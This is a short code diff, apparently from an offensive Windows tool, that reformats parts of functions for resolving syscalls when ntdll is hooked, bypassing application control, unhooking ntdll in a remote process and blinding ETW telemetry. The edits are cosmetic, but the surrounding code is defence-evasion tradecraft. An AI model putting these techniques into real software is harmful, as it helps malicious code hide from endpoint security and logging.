@@ -106,7 +106,11 @@ VOID FindSyscall(PIMAGE pNtDLLImg, PSYSCALL_ENTRY pEntry)
 
     /* Veles' Reek technique (in case all syscalls were hooked) 
     Calculate syscall number from its position between others syscalls */    
-    pEntry->wSyscall = VelesReek(pNtDLLImg->pTextSection->SizeOfRawData, (PVOID)((DWORD_PTR)GETMODULEBASE(pNtDLLImg) + pNtDLLImg->pTextSection->PointerToRawData), pFuncAddr);
+    pEntry->wSyscall = VelesReek(
+        pNtDLLImg->pTextSection->SizeOfRawData, 
+        (PVOID)((DWORD_PTR)GETMODULEBASE(pNtDLLImg) + pNtDLLImg->pTextSection->PointerToRawData), 
+        pFuncAddr
+    );
 }
 
 VOID ResolveSyscalls(PIMAGE pNtDLLImg)
@@ -340,7 +344,7 @@ BOOL BypassApplicationControl(HANDLE hProc, LPVOID lpImgBaseAddr)
     PIMAGE_NT_HEADERS pNt = NULL;
     PIMAGE_DEBUG_DIRECTORY pDbg = NULL;
     PPdbInfo pPDB;
-    IMAGE_DATA_DIRECTORY dbgDataDir;
+    PIMAGE_DATA_DIRECTORY pDbgDataDir;
     PVOID pDbgRawDataAddr;
     
     /* Read image DOS header */
@@ -360,10 +364,10 @@ BOOL BypassApplicationControl(HANDLE hProc, LPVOID lpImgBaseAddr)
         return FALSE;
 
     /* Jump to Debug data directory to retrive address and size of debug dir */
-    dbgDataDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG];
+    pDbgDataDir = &pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG];
 
     /* Read DEBUG directory */
-    if (!(pDbg = (PIMAGE_DEBUG_DIRECTORY)ReadProcessMemory2(hProc, (PVOID)((DWORD_PTR)lpImgBaseAddr + dbgDataDir.VirtualAddress), dbgDataDir.Size)))
+    if (!(pDbg = (PIMAGE_DEBUG_DIRECTORY)ReadProcessMemory2(hProc, (PVOID)((DWORD_PTR)lpImgBaseAddr + pDbgDataDir->VirtualAddress), pDbgDataDir->Size)))
         return FALSE;
 
     /* Check the type of dir we read */
@@ -392,7 +396,12 @@ BOOL BypassApplicationControl(HANDLE hProc, LPVOID lpImgBaseAddr)
 
 BOOL UnHookRemoteProcess(HANDLE hProc, PVOID pNtDLLBase, PIMAGE pFresh, PIMAGE pHooked)
 {
-    return Patch(hProc, (PVOID)((DWORD_PTR)pNtDLLBase + pHooked->pTextSection->VirtualAddress), (PVOID)((DWORD_PTR)GETMODULEBASE(pFresh) + pFresh->pTextSection->VirtualAddress), pFresh->pTextSection->Misc.VirtualSize);
+    return Patch(
+        hProc, 
+        (PVOID)((DWORD_PTR)pNtDLLBase + pHooked->pTextSection->VirtualAddress), 
+        (PVOID)((DWORD_PTR)GETMODULEBASE(pFresh) + pFresh->pTextSection->VirtualAddress), 
+        pFresh->pTextSection->Misc.VirtualSize
+    );
 }
 
 BOOL BlindETW(HANDLE hProc, HMODULE hModule)
@@ -637,4 +646,3 @@ CLEANUP:
 
     return nRet;
 }
-
